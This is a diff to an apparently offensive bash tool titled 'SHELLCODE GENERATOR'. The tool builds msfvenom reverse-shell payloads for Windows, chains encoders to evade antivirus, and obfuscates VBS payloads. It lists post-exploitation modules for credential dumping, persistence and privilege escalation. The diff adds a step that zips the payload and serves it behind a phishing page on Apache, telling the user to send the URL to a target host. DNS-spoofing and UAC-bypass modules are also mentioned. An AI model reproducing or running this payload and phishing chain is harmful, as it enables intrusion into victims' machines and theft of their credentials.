@@ -110,8 +110,7 @@ cat << !
     echo "[*] Please wait, rebuilding msf database .."
     # rebuild msf database (database.yml)
     echo ""
-    msfdb delete
-    msfdb init
+    msfdb reinit
     echo ""
     echo "[✔] postgresql connected to msf .."
     sleep 2
@@ -1284,6 +1283,7 @@ cat << !
 
 !
 
+# TODO: rever retirar as interacçoes
 # use metasploit to build shellcode (msf encoded)
 xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -a x86 --platform windows -e x86/countdown -i 7 -f raw | msfvenom -a x86 --platform windows -e x86/call4_dword_xor -i 6 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 8 -f c > $IPATH/output/chars.raw"
 
@@ -3141,7 +3141,7 @@ cat << !
 xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport --platform windows -e x86/shikata_ga_nai -i 9 -f vbs > $IPATH/obfuscate/$N4m.vbs" > /dev/null 2>&1
 echo "[☠] encoded -> shikata_ga_nai"
 sleep 2
-cat $IPATH/obfuscate/$N4m.vbs | grep '"' | awk {'print $3'} | cut -d '=' -f2
+cat $IPATH/obfuscate/$N4m.vbs | grep '"' | awk {'print $3'} | cut -d '=' -f1
 # obfuscating payload.vbs
 echo "[☠] Obfuscating sourcecode..."
 sleep 2
@@ -3186,6 +3186,23 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
 
 P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 340) > /dev/null 2>&1
 
+# ZIP payload files before sending? (apache2)
+rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payload files?" --width 270) > /dev/null 2>&1
+    if [ "$?" -eq "0" ]; then
+      # edit files nedded
+      cd $IPATH/templates/phishing
+      cp $InJEc12 mega[bak].html
+      sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
+      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
+      # copy from output
+      cd $IPATH/output
+      echo "[☠] creating archive -> $N4m.zip"
+      zip $N4m.zip $N4m.vbs > /dev/null 2>&1
+      cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1
+      echo "[☠] loading -> Apache2Server!"
+      echo "---"
+      echo "- SEND THE URL GENERATED TO TARGET HOST"
+    else
       # edit files nedded
       cd $IPATH/templates/phishing
       cp $InJEc12 mega[bak].html
@@ -3197,11 +3214,9 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
       echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
+    fi
 
         if [ "$D0M4IN" = "YES" ]; then
-        # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.vbs|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
-        cp $IPATH/output/$N4m.vbs $ApAcHe/$N4m.vbs
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -3263,6 +3278,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
 echo "[☠] Cleanning temp generated files..."
 sleep 2
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
+rm $ApAcHe/$N4m.zip > /dev/null 2>&1
 rm $IPATH/obfuscate/final.vbs > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.vbs > /dev/null 2>&1
@@ -3428,21 +3444,38 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
 fi
 
 
+# ZIP payload files before sending? (apache2)
+rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payload files?" --width 270) > /dev/null 2>&1
+    if [ "$?" -eq "0" ]; then
+      # edit files nedded
+      cd $IPATH/templates/phishing
+      cp $InJEc12 mega[bak].html
+      sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
+      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
+      # copy from output
+      cd $IPATH/output
+      echo "[☠] creating archive -> $N4m.zip"
+      zip $N4m.zip $N4m.vbs > /dev/null 2>&1
+      cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1
+      echo "[☠] loading -> Apache2Server!"
+      echo "---"
+      echo "- SEND THE URL GENERATED TO TARGET HOST"
+    else
       # edit files nedded
       cd $IPATH/templates/phishing
       cp $InJEc12 mega[bak].html
       sed "s|NaM3|$N4m.vbs|g" mega.html > copy.html
-      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
+      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
+      # copy from output
       cd $IPATH/output
       cp $N4m.vbs $ApAcHe/$N4m.vbs > /dev/null 2>&1
       echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
+    fi
+
 
         if [ "$D0M4IN" = "YES" ]; then
-        # copy files nedded by mitm+dns_spoof module
-        sed "s|NaM3|$N4m.vbs|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
-        cp $IPATH/output/$N4m.vbs $ApAcHe/$N4m.vbs
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "- POST EXPLOIT : $P0"
         echo "---"
@@ -3508,6 +3541,7 @@ mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
+rm $ApAcHe/$N4m.zip > /dev/null 2>&1
 rm $ApAcHe/$N4m.vbs > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
 sleep 2
